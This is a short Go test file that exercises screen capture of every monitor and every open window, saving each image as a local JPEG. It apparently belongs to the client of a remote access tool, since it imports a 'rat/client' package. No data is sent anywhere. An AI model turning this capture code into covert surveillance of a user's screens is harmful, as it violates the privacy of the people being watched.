//+build !headless

package screen

import (
	"fmt"
	"image/jpeg"
	"os"
	"rat/client/windows"
	"strconv"
	"testing"
)

func TestScreenshot(t *testing.T) {
	QueryMonitors()

	sc := &ScreenCapture{}
	sc.Start()

	for _, monitor := range Monitors {
		fmt.Println("Capturing monitor", monitor.ID)
		img, err := sc.CaptureMonitor(monitor)
		if err != nil {
			t.Error(err)
		}

		file, err := os.Create("test" + strconv.Itoa(monitor.ID) + ".jpg")
		if err != nil {
			t.Error(err)
		}

		if err != nil {
			t.Fatal(err)
		}
		jpeg.Encode(file, img, &jpeg.Options{
			Quality: 75,
		})
		file.Close()
	}

	sc.Destroy()
}

func TestWindows(t *testing.T) {
	windows.QueryWindows()

	sc := &ScreenCapture{}
	sc.Start()

	for _, window := range windows.Windows {
		img, err := sc.CaptureWindow(window.Handle)
		if err != nil {
			t.Error(err)
		}

		if img != nil {
			file, err := os.Create("window" + strconv.Itoa(window.Handle) + ".jpg")
			if err != nil {
				t.Error(err)
			}

			jpeg.Encode(file, img, &jpeg.Options{
				Quality: 75,
			})

			file.Close()
		}
	}

	sc.Destroy()
}
